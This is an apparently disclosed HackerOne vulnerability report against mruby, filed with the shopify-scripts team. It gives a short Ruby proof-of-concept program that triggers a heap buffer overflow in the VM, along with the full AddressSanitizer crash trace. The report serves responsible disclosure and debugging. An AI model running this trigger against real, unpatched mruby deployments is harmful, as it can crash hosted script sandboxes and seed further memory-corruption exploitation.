# Heap buffer overflow with long array assignment

## Report Details
- **Report ID**: 209449
- **URL**: https://hackerone.com/reports/209449
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-02-28T01:06:43.084Z
- **Disclosed**: 2017-03-14T21:10:25.132Z

## Reporter
- **Username**: titanous
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following program triggers a heap buffer overflow:

```text
[][]=%

[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]-=0
```

ASAN Report:

```text
=================================================================
==7193==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d00001e888 at pc 0x00000062a87f bp 0x7ffed3653990 sp 0x7ffed3653988
WRITE of size 4 at 0x61d00001e888 thread T0
    #0 0x62a87e in mrb_vm_exec /vagrant/src/vm.c:1164:9
    #1 0x622c5b in mrb_vm_run /vagrant/src/vm.c:815:10
    #2 0x650048 in mrb_top_run /vagrant/src/vm.c:2573:12
    #3 0x679f89 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #4 0x67ac25 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #5 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #6 0x7f11f1720f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #7 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)

0x61d00001e888 is located 8 bytes to the right of 2048-byte region [0x61d00001e080,0x61d00001e880)
allocated by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5c2cc5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x5503e6 in mrb_realloc_simple /vagrant/src/gc.c:201:8
    #3 0x550a34 in mrb_realloc /vagrant/src/gc.c:215:8
    #4 0x551373 in mrb_malloc /vagrant/src/gc.c:236:10
    #5 0x55140d in mrb_calloc /vagrant/src/gc.c:254:9
    #6 0x61add9 in stack_init /vagrant/src/vm.c:97:28
    #7 0x618208 in mrb_funcall_with_block /vagrant/src/vm.c:376:7
    #8 0x617c22 in mrb_funcall_with_block /vagrant/src/vm.c:354:13
    #9 0x61748c in mrb_funcall_argv /vagrant/src/vm.c:461:10
    #10 0x524b21 in mrb_obj_new /vagrant/src/class.c:1425:5
    #11 0x53e89e in mrb_exc_new_str /vagrant/src/error.c:32:10
    #12 0x548218 in mrb_init_exception /vagrant/src/error.c:549:20
    #13 0x6a8590 in mrb_init_core /vagrant/src/init.c:41:3
    #14 0x5c2c65 in mrb_open_core /vagrant/src/state.c:47:3
    #15 0x5c2e0c in mrb_open_allocf /vagrant/src/state.c:107:20
    #16 0x5c2dda in mrb_open /vagrant/src/state.c:99:20
    #17 0x4f29d3 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:172:20
    #18 0x7f11f1720f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287

SUMMARY: AddressSanitizer: heap-buffer-overflow /vagrant/src/vm.c:1164:9 in mrb_vm_exec
Shadow bytes around the buggy address:
  0x0c3a7fffbcc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c3a7fffbd10: fa[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbd60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7193==ABORTING
```

## Attachments
No attachments
